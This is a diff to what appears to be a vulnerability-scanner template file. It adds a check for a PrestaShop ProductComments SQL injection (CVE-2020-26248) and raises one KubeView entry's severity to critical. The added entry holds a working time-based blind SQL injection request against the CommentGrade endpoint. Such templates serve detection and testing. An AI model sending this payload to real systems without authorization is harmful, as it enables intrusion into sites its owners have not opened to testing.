@@ -12484,6 +12484,20 @@
       ]
     },
     {
+      "id": "CVE-2020-26248",
+      "info": {
+        "name": "PrestaShop ProductComments < 4.2.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 20s\nGET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a) HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-26413",
       "info": {
         "name": "Gitlab User enumeration via Graphql API",
@@ -23254,7 +23268,7 @@
       "id": "CVE-2022-45933",
       "info": {
         "name": "KubeView - Information disclosure",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
